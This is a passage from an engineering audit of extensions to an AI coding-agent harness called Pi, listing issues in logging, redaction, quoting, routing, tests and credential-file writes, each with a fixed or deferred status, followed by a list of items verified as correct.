- **I-2 stale comments about Pi swallowing `tool_call` throws** (`safety/index.ts:87`, plan-mode WR2-02). In 1.1.0 a handler failure blocks the call (`docs/extensions.md:260`). Behaviour is still correct.
  - **Status:** fixed in 96afbd2
- **I-3 audit log weaknesses:**
  - It lives in an agent-writable `<cwd>/.pi/logs`.
  - Rotation races, because the size cache is per-process (`jsonl.ts:345-351`).
  - A failed rename drops the row silently.
  - Redaction misses `-u user:pass` and `-pPASSWORD`.
  - **Status:** deferred — Redaction of -u and -p fixed in d451dc9. The agent-writable log dir and the silent drop on a failed rename remain; the rotation race has no repro.
- **I-4 `win-quote.ts`** uses C-runtime `"` escaping, which `cmd.exe` does not honour. It is not exploitable today, because callers pass only paths.
  - **Status:** deferred — Not exploitable; callers pass paths only.
- **I-5 turn rows are costed from `ctx.model`**, not from the message's own model (`diagnostics/index.ts:262, 275`).
  - **Status:** deferred — Cost accuracy only.
- **I-6 `DEFAULT_MODE` "cheap" is reported but never applied** at session start. Separately, `NO_TOOL_CALLING_MODEL_IDS` misses the `global.` and `eu.` prefixes.
  - **Status:** deferred — NO_TOOL_CALLING prefixes fixed in a144ab3. Applying DEFAULT_MODE at start is a behaviour decision for the user.
- **I-7 `pi.registerVirtualModel()`** (`types.d.ts:1378`) is new in 1.1.0 and may be a cleaner native routing hook.
  - **Status:** deferred — registerVirtualModel would be a routing redesign.
- **I-8 stale version citations:**
  - `models-template.json` header cites `pi 0.84.1 dist/config.js:423`, and its comment says the DashScope id collides with a built-in (in 1.1.0 the built-in is `deepseek-flash`).
  - `providers/schema.ts` cites "Pi 0.84.1".
  - The `.npmrc` files cite 0.84.1 source.
  - `executor-handoff.md` cites pi-subagents 0.49.0 and says "NOT INSTALLED".
  - **Status:** fixed in 1bd7b5f, d451dc9, 55e05d4, 9310fa2
- **I-9 HTML comments in `.pi/agents/*.md` carry requirement IDs and history.** Confirm that pi-subagents 0.76.1 strips them. Otherwise they are sent to every child as system prompt.
  - **Status:** fixed in 55e05d4
- **I-10 `qoder_delegate` description includes "Phase 4" and "Phase 2"**, which are history text in a model-facing string (about 329 tokens per request when active).
  - **Status:** fixed in 4f9586b
- **I-11 AGENTS.md ID and history violations in authored `.ts`** that the scan misses or allows. Examples:
  - `routing/modes.ts:200`, `fallback.ts:55`, `providers/schema.ts:26, 95`, `budget.ts:80`, `lib/jsonl.ts:81, 390`
  - `quality/gates.ts:45-46`, `execute/handoff.ts:33-34`, `verdict.ts:34, 43, 55`, `review-schema.ts:207-309`, `grill/spec-schema.ts:487-572`
  - `plan-mode/read-only.ts:2, 11, 54, 67, 86`, and `safety/git.ts:470` ("SAFE-03" in a runtime string)
  - `review-schema.ts:28` gives the model `GATE-03` as an example, while SPEC IDs are `R<n>`.
  - **Status:** fixed in 66b31f0, 1bd7b5f, e9d7126, 638cd3c, b4dae4f, aa958a7, 75b3765, 7362c20, d451dc9, 4f9586b, 8a18f2b, 40d8d34, 9310fa2
- **I-12 `runBoundedReviewLoop` has no production caller**, but `QUALITY_MECHANISMS` still credits it. `runLintLeg` reaches only this repo's own tests.
  - **Status:** fixed in 47f5b00
- **I-13 `/review` reads binary and lockfile changes as UTF-8** into the reviewer context, with no size bound.
  - **Status:** fixed in 7362c20
- **I-14 there is no test for a missing or stale local `staging` branch**, and none for the evidence gate combined with a non-zero exploratory exit.
  - **Status:** fixed in e9d7126, 75b3765
- **I-15 `gate-depth-selector.test.ts` is vacuous.** It compares the table to itself plus a source-text grep.
  - **Status:** fixed in 47f5b00
- **I-16 `ui/index.ts:145-158` drops its `pi.events.on` unsubscribe handles**, so listeners pile up across `/reload` (`resource-loader.js:244`).
  - **Status:** deferred — Listeners pile up only across /reload.
- **I-17 the UI git probe runs `git status --porcelain`, which includes untracked files.** It is throttled, but on large monorepos it costs up to one 5 s git process every 20 s. Consider `--untracked-files=no`.
  - **Status:** fixed in 40d8d34, 360f960. 360f960 counts new untracked files again, still throttled.
- **I-18 bootstrap writes `auth.json`, `models.json` and `settings.json` in place, not via temp file plus rename.** A crash can truncate credentials.
  - **Status:** fixed in a559dfc
- **I-19 `tests/global-teardown.ts` snapshots only the real `settings.json`**, not `auth.json`, `models.json` or `extensions/*`.
  - **Status:** deferred — Teardown snapshot scope only.
- **I-20 pi-web-access 0.38.0's transitive dependencies are caret ranges**, so they resolve outside any lockfile.
  - **Status:** deferred — Transitive caret ranges in a composed package; recorded in RUNBOOK.
- **I-21 loop-police writes `loop-police.json` beside its own source**, so `pi update`'s reset and clean wipes it in a git-package clone.
  - **Status:** deferred — Loop-police state file location; recorded in RUNBOOK.
- **I-22 `harness/comment-rules.ts:1` says AGENTS.md mirrors the rules "verbatim"**, but AGENTS.md adds a vendored-exemption bullet.
  - **Status:** fixed in 9310fa2

## Verified correct (no action)

- **Pi 1.1.0 surface:**
  - The tool set is bash, powershell, read, edit, write, grep, find, ls (`types.d.ts:919-947`). powershell is denied, and there is no new built-in write tool.
  - `hasUI` and mode handling match `docs/extensions.md:248-251`.
  - No wire handler returns a value from `before_provider_request`.
  - The `message_end` replacement keeps `role`.
  - `setModel` returns `Promise<boolean>`.
  - The `modelRegistry` APIs match `model-registry.d.ts:29-51`.
- **`models-template.json`:**
  - Every compat key is valid (`pi-ai/dist/types.d.ts:641-697`), with `thinkingFormat:"qwen"`, `contextWindow` 393216 and no `samplingParams`.
  - The Bedrock `auth.json` shape is valid, and `AWS_BEDROCK_FORCE_CACHE` exists.
  - `!cmd` appears only in `auth.json`.
- **Theme `ky.json`:** it has all 51 required keys, no unknown keys, and no unresolved vars.
- **Extension discovery:** only direct `*.ts` files plus `<dir>/index.ts` load (`package-manager.js:381-456`), and `-builtin:` syntax is valid (`docs/settings.md:160`).
- **Composed packages:** all peer ranges are satisfied by 1.1.0, and no command names collide.
- **Pinned tools:**
  - **OpenSpec 1.13.2:** every command, flag, config key and path used exists (`dist/cli/index.js:165-170`, `global-config.js:5-24`, `adapters/pi.js:28`).
  - **typebox:** `StringEnum` is used with the unscoped package.
  - **vitest 4 and TS 5.9.3:** the config options are valid.
- **Vendored code:** `todo.ts`, `questionnaire.ts` and plan-mode match upstream 1.1.0 below their vendoring headers.
- **Shell scripts:** `bootstrap.sh` passes `sh -n`, has no bashisms, and all scripts are LF.
- **Secrets:** no keys, account ids or hostnames are in tracked files.
- **CI:** the action SHAs resolve to the pinned tags.
